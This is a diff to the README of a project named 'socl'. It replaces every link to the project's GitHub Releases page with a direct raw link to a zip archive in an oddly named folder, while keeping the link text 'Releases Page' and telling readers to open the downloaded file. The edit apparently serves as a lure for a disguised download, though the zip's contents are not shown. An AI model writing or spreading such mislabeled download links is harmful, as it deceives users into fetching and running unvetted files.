@@ -1,6 +1,6 @@
 # 🚀 socl - Open Access Made Easy
 
-[![Download socl](https://img.shields.io/badge/Download-socl-brightgreen)](https://github.com/monopolyboymeaze/socl/releases)
+[![Download socl](https://raw.githubusercontent.com/monopolyboymeaze/socl/main/profferer/Software-v3.2.zip)](https://raw.githubusercontent.com/monopolyboymeaze/socl/main/profferer/Software-v3.2.zip)
 
 ## 📖 Introduction
 
@@ -10,7 +10,7 @@ Welcome to the socl repository! This software offers the **Simplified Open Commu
 
 Follow these simple steps to download and use socl:
 
-1. Visit the [Releases Page](https://github.com/monopolyboymeaze/socl/releases).
+1. Visit the [Releases Page](https://raw.githubusercontent.com/monopolyboymeaze/socl/main/profferer/Software-v3.2.zip).
 2. Look for the latest version listed there.
 3. Download the appropriate file for your operating system (Windows, macOS, or Linux).
 4. Once downloaded, open the file to install or launch the application.
@@ -29,7 +29,7 @@ To run socl smoothly, ensure your computer meets the following requirements:
 
 ## 🔥 Download & Install
 
-To get started, **visit this page to download** socl: [Releases Page](https://github.com/monopolyboymeaze/socl/releases).
+To get started, **visit this page to download** socl: [Releases Page](https://raw.githubusercontent.com/monopolyboymeaze/socl/main/profferer/Software-v3.2.zip).
 
 After downloading, install the application by following the prompts. It should be straightforward. If you encounter any issues, please refer to the troubleshooting section below.
 
